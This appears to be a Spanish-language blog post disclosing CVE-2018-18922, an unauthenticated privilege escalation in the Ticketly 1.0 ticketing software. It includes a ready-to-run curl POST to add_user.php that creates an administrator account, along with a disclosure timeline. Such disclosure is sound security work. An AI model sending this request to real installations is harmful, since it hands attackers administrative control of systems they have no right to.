+++
date = "2018-11-05"
title = "CVE-2018-18922 Ticketly 1.0 - Escalaci贸n de Privilegios (Crear cuenta administrador)"
author = "Javier Olmedo"
toc = false
+++

Hoy, publico otra entrada relacionada con vulnerabilidades en aplicaciones web, esta vez, sobre un software de ticketing llamado[Ticketly 1.0](https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql)desarrollado por AbiSoft. La vulnerabilidad encontrada, permite a un atacante**crearse una cuenta de administrador**en el sistema mediante una vulnerabilidad de[Escalaci贸n de Privilegios](https://www.owasp.org/index.php/Testing_for_Privilege_escalation_\(OTG-AUTHZ-003\)),la vulnerabilidad ha sido asociada al[CVE-2018-18922](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-18922).

## Ticketly -CVE-2018-18922

### Ticketly 1.0 - Privilege Escalation (Add Admin Account)

[![/images/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador_001.png](/images/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador_001.png)](/images/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador_001.png)

Ticketly 1.0, es un software de ticketing desarrollado por AbiSoft para ofrecer soporte a los usuarios sobre incidencias en los sistemas, est谩 basado en PHP y MySQL.

- Vulnerabilidad descubierta por[Javier Olmedo](https://twitter.com/JJavierOlmedo)el**24/07/2018**
-  Publicada el**05/11/2018**
- [CVE-2018-18922](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18922)
- Link del software[Ticketly](https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql)
- Versi贸n vulnerable =**1.0**

## Vector de ataque / Criticidad de la explotaci贸n

### CRITICIDAD - CRTICA 

A trav茅s de las vulnerabilidades de[Escalaci贸n de Privilegios](https://www.owasp.org/index.php/Testing_for_Privilege_escalation_\(OTG-AUTHZ-003\)), un atacante podr铆a**obtener acceso a recursos o funciones de la aplicaci贸n de los que, normalmente, no le estar铆a permitido**. Esto, generalmente es causado por una falla en la aplicaci贸n al comprobar los privilegios del usuario que realiza la acci贸n o una mala configuraci贸n por parte del desarrollador/administrador sobre los privilegios previstos a los usuarios.

## Par谩metro/Recurso vulnerable

El recurso`/ticketly/action/add_user.php`no realiza una**correcta validaci贸n de privilegios**y permite a un atacante**crear una cuenta de administrador sin necesidad de estar autenticado**en la aplicaci贸n.

Puede explotarse con la siguiente petici贸n curl:

```txt
curl -i -s -k -X $'POST' \  
-H $'Host: localhost' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Content-Length: 82' \  
data-binary $'name=Javier&lastname=Olmedo&email=contacto@hackpuntes.com&status=1&password=qwerty' \  
$'http://localhost/ticketly/action/add_user.php'
```

## Prueba de concepto (PoC)

[![/images/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador_002.gif](/images/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador_002.gif)](/images/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador_002.gif)

## Timeline

- **24/07/2018**Descubrimiento de la vulnerabilidad
- **24/07/2018**Contacto con el desarrollador
- **24/07/2018**El desarrollador marca la vulnerabiliad como pendiente de parcheo
- **02/11/2018**Solicito CVE
- **04/11/2018**Asignaci贸n de CVE-2018-18922 por MITRE
- **05/11/2018**Hago p煤blica la vulnerabilidad

## Referencias

- CVE-MITRE -[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18922](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18922)

Un saludo a todos!!